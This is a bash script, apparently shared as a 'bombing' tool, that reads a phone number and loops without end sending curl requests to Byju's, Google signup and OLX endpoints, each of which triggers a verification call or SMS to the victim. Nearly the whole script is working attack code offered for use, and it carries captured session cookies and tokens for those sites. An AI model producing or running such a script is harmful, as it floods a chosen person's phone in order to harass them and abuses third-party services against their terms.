#!/bin/bash
clear
bash .files/logo.sh
# # # # # # # # # # # # # # # # # #
#  ╭⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱╮  #
#  l| ⚝ ɪɴsᴛᴀɢʀᴀᴍ ꚸ ᴍ 𝟺 ᴜ . ʏ ᴛ  |l  #
#  l|      ✘ ηθικός : χάκερ ✘      |l  #
#  l|   ⛥ m4u-yt.blogspot.com ⛥   |l  #
#  ╰⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱┈⊰᯽⊱╯  #
# # # # # # # # # # # # # # # # # #
#∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘#

logo="Created By ❤️ M4U.YT"
echo "$logo"
off="Press <CTRL+C> to [0FF]"
echo "$off"
echo "Enter Number Without Country C∅de"
read m4u
status="Infinity ∞ B∅mbing [0N] $m4u"
echo "$status"
while :
do
#∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘∘#
#<∅>03</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://bcas-prod.byjusweb.com/api/voice?phoneNumber='$m4u'&page=free-trial-classes' \
  -H 'authority: bcas-prod.byjusweb.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'origin: https://byjus.com' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://byjus.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  --compressed
#<∅>02</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://accounts.google.com/_/signup/sendidv?hl=en-GB&TL=AM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu&_reqid=542533&rt=j' \
  -H 'authority: accounts.google.com' \
  -H 'x-same-domain: 1' \
  -H 'google-accounts-xsrf: 1' \
  -H 'user-agent: Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1' \
  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
  -H 'accept: */*' \
  -H 'origin: https://accounts.google.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://accounts.google.com/signup/v2/webgradsidvverify?continue=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&dsh=S553682139%3A1620194503669767&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: NID=215=Wxm1dZiIiqIf-tbgdvidmywBZVUYoGM99rg71aL55tXc1tLaR4zfrwS2iiLTm13Gs4JB0EEYoex38JsHXKv4ZOgGGZi-0bOVMbKGdWA2DeeM3k2S61QuVMt1TO11drPF_DNKQWUoqjoVU0qAMEbV_3Rtzklkz6sPYBIA2y5EFcs; __Host-GAPS=1:UrgilFhgGzuQiashKKNwy_ZgQWK5Yw:GBSFZkRgt6arxT8Y' \
  --data-raw 'continue=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&dsh=S553682139%3A1620194503669767&f.req=%5B%22TL%3AAM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu%22%2Cnull%2C%220'$m4u'%22%2C%22in%22%2C3%2Cnull%2C2%2Cnull%2C%5B%5D%5D&azt=AFoagUWA-OHLWOUtP5SiITwa7-nC3aLuqA%3A1620194621658&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IN%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2Cfalse%2Cnull%2C%22%22%5D&gmscoreversion=undefined&' \
  --compressed
#<∅>01</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.olx.in/api/auth/authenticate?lang=en' \
  -H 'authority: www.olx.in' \
  -H 'accept: */*' \
  -H 'x-newrelic-id: VQMGU1ZVDxABU1lbBgMDUlI=' \
  -H 'x-panamera-fingerprint: 70ffbbf8001589eb6b229252a71f0b90#1620191540737' \
  -H 'user-agent: Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.olx.in' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.olx.in/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: laquesis=pan-48200@b#pan-48658@b; laquesisff=pan-36788#pan-38000#pan-42665; bm_sz=29453BA6C68E8CDC20E1EE16B77BD914~YAAQDdgsMTZCGjV5AQAAZunwOgsUFzXaUWgrmqux6pQZsZJjjeq6/NWJSxLOPcNYZv1Auwft+Q5hyd8OI5yXYEcO3Mf9jMzD6MCSCJEwIyB+as7BnQPhJ6sEpEQqkRs7Avmqj8EknniNaqXqMezMkbZba8vu9eibFObSB9+jXD96+YWna9v/rbpodRc2rBnu3I94VhVx/7jFEYGIKnRQHu6gLEafKNjrtOJBtwozvfUYTYsIVZAxCbna2Q==; bm_mi=3155871FCD3A77A2170153695D7715E2~OFzoVLl0yjdXYWiIQ89xXsVjoFqWCT6nvgMNjnMP4wIpHtCYpv8g8l5fVH3LcOitBAMfvt67eFZZpypnhPkVWIsr7iG0u+iUfDliIQwLPyoZxTGeJ309IafLQmqRdW04Nxa45npfburmGJto1HhMk6jlybT2tssSqPo+LXx3o5zqJfP3S6vAEJFtNBSx/ptQHHbuybYZ3jrRYYvPFZ5omHEz80iRg5mCPNEyAN3KzE+/L9VbUk4fn/PlS2IGx+uHm17qB+F7mSK/t+34zNijKw==; ldTd=true; lqstatus=1620192737|1793af0e7c5x24f60240|pan-48200; _ga=GA1.2.1664878203.1620191542; _gid=GA1.2.431324241.1620191542; _gcl_au=1.1.999877154.1620191542; WZRK_G=ac511e8e3d354d92b2e033540d284f91; _fbp=fb.1.1620191543642.668882890; G_ENABLED_IDPS=google; AMP_TOKEN=%24NOT_FOUND; g_state={"i_p":1620198745083,"i_l":1}; ak_bmsc=C6BDF08AC27F9934D1E2F463B919BAFF312CD80D7B3B0000312992601A5B636B~plefw7JAcoLeZAJF0MsvzXZdUWu/50b9RlTzEwBOLbc0Q4vivha/8mqTXdMzTNqqMegK3XdUdkQKAi9B0RMrmnGgazr3tfI0aFELGiPncdvbpZDfGN+2QS58e5ONetuSXsDGNQ/wr3HJNANP9FxGN3ieqNfhsRyATORLsksITupr44SmQkYvujDgcioM+grAQM2LMI/DYMXlaNcKCHTOc2y4ZuTj0W9w/AZ8yW1lDtlRIN1IryZo6HHoblzbP5XPk9pIyyW7VKd933+y0nCHMlW00M+eRqDeE4/GfY+fV/X4J4CjPcOcppVsvIqDcSur9R; bm_sv=FE42EAD7408C3F80E8F4C26532F2E707~dgtqzu96Fu/UPkVkXy5ni/Yd5q7pT+rAVhYEPYImzv8sb/DLEEuPfhRpvrKHRr/2CnKhLbkvSrQLFW7DRpHnZYDHr3NtpUZpkOAv/IhIdffXALmAQkT0EBgMy/gBfz+2c9jd6bv8G5kRdNX2lVme020mVk/dWXWz5JNUUlETSDU=; _abck=FFB6AEF6BFA711160B10126FDE2BAD22~0~YAAQDdgsMYBLGjV5AQAAp13xOgURDMMkorSOkJUpDMNEyBb7d5grrPeVKxkwV8HJrq9jReeCkTzi5fl+nvjH+YqDEKpzbIu0t34mXHMmmOYpUJARQpDhr1MmP1Bto+7+ER+oUMkMzA+shEw5gv06/BL/GEI2Gc0W0kV8JwTUV7wzGgzDEvvJfTTuBQWsmKGeOkZLcnlxd6dukyqfNULsSJS2olCcMtM5QPvjWOrXouuezzkaQBkpS0XJ1SXRkvGoXn95IZLqEQH+kxbQ2TX2EacpwNqP8Mp5da1qoPHdUyKNsPr9q/CdyVy8ybUg4d+m2+9xfZ5ereAkqfkmi2K7n0RqAWvj4CpJDb+i6XvXROHr9fB6zqgu0jjuK1KTwMsCxlVtkOurbRjrYlK4xYBYWSN8uQ==~-1~-1~-1; onap=1793af0e7c5x24f60240-1-1793af0e7c5x24f60240-13-1620193368; WZRK_S_848-646-995Z=%7B%22p%22%3A1%2C%22s%22%3A1620191543%2C%22t%22%3A1620191567%7D' \
  --data-raw '{"grantType":"retry","method":"call","phone":"+91'$m4u'","language":"en"}' \
  --compressed
#<∅>0</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
done